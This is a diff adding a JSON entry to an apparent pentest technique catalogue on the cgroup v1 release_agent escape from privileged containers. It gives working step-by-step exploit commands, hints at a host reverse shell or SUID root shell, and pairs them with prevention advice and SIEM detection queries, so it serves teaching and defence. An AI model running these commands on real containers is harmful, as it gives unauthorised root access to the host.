@@ -1,0 +1,105 @@
+{
+  "id": "linux-cgroup-release-agent-escape",
+  "name": "cgroup v1 release_agent privileged-container escape",
+  "command": "echo <host_script> > /sys/fs/cgroup/<ctrl>/release_agent   # host runs it as root",
+  "description": "A privileged (or CAP_SYS_ADMIN, SYS_ADMIN-granted) container that can mount a cgroup v1 controller can abuse the release_agent mechanism to execute a command on the HOST as root. The attacker mounts an RDMA (or other) cgroup controller, writes a host-path script into release_agent, enables notify_on_release on a child cgroup, and then empties that cgroup; the kernel runs the release_agent script in the host's root namespace. Classic privileged-container breakout.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Container Escape",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Unit 42 / Trailofbits / cgroup release_agent escape",
+  "tags": [
+    "cgroup",
+    "release-agent",
+    "notify-on-release",
+    "container-escape",
+    "cap-sys-admin",
+    "privesc"
+  ],
+  "mitre": [
+    "T1611"
+  ],
+  "exam": "lab-only",
+  "notes": "=== WHAT IT IS ===\n  cgroup v1 supports a 'release_agent': a host-side program the kernel runs (as root,\n  in the host namespace) when the last task leaves a cgroup that has notify_on_release=1.\n  A container that can mount a cgroup controller can set release_agent to its own\n  script and trigger it -> code execution on the host.\n\n=== PREREQUISITES ===\n  # Container must have CAP_SYS_ADMIN (e.g. docker run --privileged or --cap-add=SYS_ADMIN)\n  capsh --print | grep sys_admin\n  # cgroup v1 present (release_agent does not exist in pure cgroup v2)\n  ls /sys/fs/cgroup\n\n=== EXPLOIT (inside the container) ===\n  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n  echo 1 > /tmp/cgrp/x/notify_on_release\n  # find this container's path on the host:\n  host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n  cat > /cmd <<EOF\n  #!/bin/sh\n  ps aux > $host_path/output\n  EOF\n  chmod +x /cmd\n  # trigger: spawn then exit a process in the child cgroup\n  sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n  cat /output      # command ran on the host as root\n\n=== TURN INTO ROOT SHELL ===\n  # make /cmd drop a host reverse shell or 'cp /bin/bash /host/tmp/rootbash; chmod 4755 ...'\n\n=== ALTERNATIVES ===\n  runc leaky-vessels (CVE-2024-21626); docker-socket abuse; --privileged /dev host-disk mount",
+  "examples": [
+    {
+      "label": "Confirm CAP_SYS_ADMIN and cgroup v1",
+      "command": "capsh --print | grep sys_admin; ls /sys/fs/cgroup"
+    },
+    {
+      "label": "Mount a cgroup controller and arm notify_on_release",
+      "command": "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release"
+    },
+    {
+      "label": "Point release_agent at a host script and trigger it",
+      "command": "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+    }
+  ],
+  "references": [
+    {
+      "title": "Unit 42 - Docker privileged container escape",
+      "url": "https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/"
+    },
+    {
+      "title": "Trail of Bits - release_agent escape explained",
+      "url": "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
+    },
+    {
+      "title": "HackTricks - Docker release_agent escape",
+      "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-docker-escape",
+      "note": "Broader container-escape catalogue.",
+      "rel": "alternative"
+    },
+    {
+      "id": "linux-runc-leaky-vessels",
+      "note": "runc leaked-fd escape as a sibling technique.",
+      "rel": "alternative"
+    },
+    {
+      "id": "docker-socket-exposed",
+      "note": "Escape path when the Docker socket is mounted instead.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "cgroup v1's release_agent is a host-side program the kernel executes, as root in the host namespace, when the last process leaves a cgroup with notify_on_release set. A container with CAP_SYS_ADMIN can mount a cgroup controller and write both release_agent and notify_on_release, then empty the cgroup, causing the kernel to run the attacker's script outside the container boundary.",
+    "prerequisites": "A container running with CAP_SYS_ADMIN (e.g. --privileged or --cap-add=SYS_ADMIN) so it can mount a cgroup v1 controller, and a host exposing cgroup v1 (release_agent does not exist under pure cgroup v2). Knowledge of the container's path on the host (from /etc/mtab).",
+    "impact": "Arbitrary command execution on the host as root from inside the container - a complete escape of the container isolation boundary.",
+    "detection": "[MITRE T1611] Writes to a cgroup release_agent file and toggling notify_on_release from within a container; a container mounting a cgroup controller (mount -t cgroup); host-side execution of a script located in a container's overlay/merged directory; unexpected root processes spawned by the kernel/systemd whose path lies in a container layer.",
+    "artifacts": "auditd records of mount -t cgroup and writes to release_agent / notify_on_release / cgroup.procs; a release_agent pointing at a container overlay path; a host process whose binary resides under /var/lib/docker/overlay2; EDR container-escape alerts.",
+    "splunk_spl": "index=linux sourcetype=\"linux:auditd\"\n| search (name=\"*release_agent*\" OR name=\"*notify_on_release*\" OR proctitle=\"*mount -t cgroup*\")\n| table _time, host, auid, exe, name, proctitle",
+    "elastic_kql": "(file.path:*release_agent* or file.path:*notify_on_release*) or (process.name:mount and process.args:cgroup)",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"release_agent\",\"notify_on_release\") or (SyslogMessage has \"mount\" and SyslogMessage has \"-t cgroup\")\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// container writing cgroup release_agent to run a script on the host (T1611)",
+    "sigma_rules": "lnx_cgroup_release_agent_escape (write to release_agent + notify_on_release from a container)",
+    "prevention": "Do not run containers with --privileged or CAP_SYS_ADMIN unless strictly required; drop SYS_ADMIN and all unneeded capabilities. Prefer cgroup v2 (no release_agent). Enforce seccomp/AppArmor/SELinux profiles that block mount and cgroup writes; use user namespaces for containers. Monitor for release_agent writes.",
+    "sources": [
+      "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",
+      "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "cgroup release_agent write from container (escape)",
+        "logic": "Syslog\n| where SyslogMessage has_any (\"release_agent\",\"notify_on_release\") or (SyslogMessage has \"mount\" and SyslogMessage has \"-t cgroup\")\n| project TimeGenerated, Computer, SyslogMessage",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1611"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate workloads almost never write release_agent; some older container tooling mounts cgroup controllers.",
+        "tuning": "Alert on any write to a release_agent file from a container context; correlate with a host process running from a container overlay path."
+      }
+    ]
+  }
+}
